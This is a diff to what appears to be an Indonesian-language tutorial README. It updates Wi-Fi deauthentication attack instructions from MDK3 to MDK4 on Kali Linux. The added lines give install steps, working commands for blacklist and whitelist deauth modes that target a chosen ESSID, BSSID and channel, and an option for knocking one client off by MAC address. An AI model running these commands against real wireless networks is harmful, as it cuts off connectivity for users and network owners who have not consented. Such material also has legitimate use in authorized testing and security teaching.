@@ -17,9 +17,9 @@ Kali Linux:
    
    ```
    sudo apt-get update
-   sudo apt-get install build-essential libpcap-dev git
-   git clone https://github.com/charlesxsh/mdk3-master
-   cd mdk3-master
+   sudo apt-get install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev git
+   git clone https://github.com/aircrack-ng/mdk4
+   cd mdk4
    make
    sudo make install
    ```
@@ -52,22 +52,26 @@ Kali Linux:
 sudo airodump-ng [interface]
 ```
 
-**2. Jalankan MDK3:**
+**2. Jalankan MDK4:**
 
    1. Blacklist mode:
 
       ```
-      sudo mdk3 wlan0 d -b [file_blacklist] -c [channel]
+      sudo mdk4 [interface] d -b [file_blacklist] -E [essid] -B [bssid] -c [channel] 
       ```
 
       Blacklist mode itu hanya melakukan deauth terhadap client yang ada di file `[file_blacklist]`. Client lainnya akan diabaikan.
    2. Whitelist mode:
 
       ```
-      sudo mdk3 wlan0 d -w [file_whitelist] -c [channel]
+      sudo mdk4 [interface] d -w [file_whitelist] -E [essid] -B [bssid] -c [channel]
       ```
 
       Whitelist mode itu kebalikan dari blacklist mode. Semua client akan di-deauth, kecuali yang ada di file `[file_whitelist].` (dilindungi).
+
+   > **Catatan:**
+   > - Pada blacklist mode, bisa ditambahkan opsi `-w [file_whitelist]` agar client yang ada di file tersebut tidak di-deauth (dilindungi).
+   > - Kalu ingin deauth client tertentu gunakan opsi `-S [mac_client]`.
 
 ## Video Demonstrasi
 
